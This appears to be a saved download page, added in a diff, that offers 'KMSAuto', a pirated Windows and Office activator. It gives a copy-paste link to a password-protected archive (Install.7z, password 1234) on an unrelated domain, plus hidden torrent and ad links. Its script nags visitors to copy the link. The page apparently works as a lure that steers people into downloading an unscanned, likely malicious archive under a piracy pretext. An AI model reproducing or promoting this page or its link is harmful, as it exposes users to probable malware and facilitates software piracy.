@@ -1,0 +1,126 @@
+
+<!-- saved from url=(0112)https://valis03.com/KMSAuto___v1.8.5_%28Activate_Windows_and_MS_Office%29.zip?c=ADlQJWUmRAUA51sCAFpXHAASAAAAAABt -->
+<html style="filter: hue-rotate(8deg);"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		<title>Media sharing</title>
+		
+		<link rel="stylesheet" href="./Media sharing_files/style.css">
+		<!--<script defer src='/daopush-init.js'></script>-->
+		<script>document.documentElement.style.cssText="filter:hue-rotate(8deg)";</script>
+		<style>
+			.torrent {
+				display: flex; 
+				justify-content: center; 
+				align-items: center;
+				background: #3f813a;
+				border-radius: 31px; 
+				border: none;
+				color: #FFFFFF;
+				transition: 0.4s;
+				height: 54px;
+				width: 171px;
+			}
+			
+			.torrent:hover {
+				cursor: pointer;
+			}
+		</style>
+	</head>
+	<body style="background-color: #F1F1F1;flex-wrap: wrap; align-items: normal !important;">
+	
+		<div class="base_form" style="display: block; margin-top: calc(50vh - 173px - 27px);">
+			<img src="./Media sharing_files/download-folder.png" width="80" height="80">
+			<p class="filename">KMSAuto___v1.8.5_%28Activate_Windows_and_MS_Office%29.zip</p>
+			<p class="linkstatus">Your download link is ready...</p>
+			<p class="notice">If link is not clickable, copy and paste it into the address bar.</p>
+			<div class="input_wrapper">
+				<input type="text" value="https://cuentasstreaming.com/01765/Install.7z?fpo=KMSAuto___v1.8.5_%28Activate_Windows_and_MS_Office%29.zip" readonly="">
+				<button class="copy_btn" onclick="fnCopy();">
+					<span class="copy_icon"></span>Copy
+				</button>
+				<div id="notif_tocopy" class="notif" style="top: -50px;left: 550px;">
+					<p class="copy">Copy link</p>
+				</div>
+				<div id="notif_copied" class="notif" style="top: -50px;left: 567px;">
+					<p class="copied">Copied</p>
+				</div>
+			</div>
+			<p class="filepass">PASSWORD: 1234</p>
+		</div>
+		<div style="display: none;justify-content:center;width: 100vw;height: 100px;margin-bottom: 10vh;">
+			<a class="torrent" href="https://valis03.com/File.torrent">
+				Download .torrent
+			</a>
+		</div>
+		<div style="display: none;justify-content:center;width: 100vw;height: 100px;">
+			<a target="_blank" href="https://earnl.fi/"><img src="./Media sharing_files/guess-.gif" width="736" height="100"></a>
+		</div>
+		<script>
+			var is_copied = false;
+			
+			function resetNotif(element) {
+				if (document.getElementById(element).classList.contains('active'))
+					document.getElementById(element).classList.remove('active');
+			}
+			
+			function fnCopy() {
+				if (!document.getElementById('notif_copied').classList.contains('active')) {
+					document.getElementById('notif_copied').classList.add('active');			
+					setTimeout(resetNotif, 1500, 'notif_copied');
+				}
+				
+				copyToClipboard(document.getElementsByTagName('input')[0].value);
+				
+				is_copied = true;
+			}
+			
+			function copyToClipboard(text) {
+				if (window.clipboardData && window.clipboardData.setData) {
+					return window.clipboardData.setData("Text", text);
+				}
+				else if (document.queryCommandSupported && document.queryCommandSupported("copy")) {
+					var textarea = document.createElement("textarea");
+					textarea.textContent = text;
+					textarea.style.position = "fixed"; 
+					document.body.appendChild(textarea);
+					textarea.select();
+					try {
+						return document.execCommand("copy");
+					}
+					catch (ex) {
+						return prompt("Copy to clipboard: Ctrl+C, Enter", text);
+					}
+					finally {
+						document.body.removeChild(textarea);
+					}
+				}
+			}
+			
+			function fnToCopy() {
+				if (!document.getElementById('notif_tocopy').classList.contains('active')) {
+					document.getElementById('notif_tocopy').classList.add('active');			
+					setTimeout(resetNotif, 1500, 'notif_tocopy');
+				}
+			}
+			
+			function checkInactive() {
+				if (is_copied) return;
+			
+				if (typeof checkInactive.inactive_counter == 'undefined')
+					checkInactive.inactive_counter = 0;
+
+				checkInactive.inactive_counter++;
+
+				if (checkInactive.inactive_counter == 3) {			
+					checkInactive.inactive_counter = 0;
+					fnToCopy();
+					setTimeout(checkInactive, 2000);
+				} else {
+					setTimeout(checkInactive, 1000);
+				}
+			}
+			
+			setTimeout(checkInactive, 1000);
+		</script>	
+
+
+</body></html>
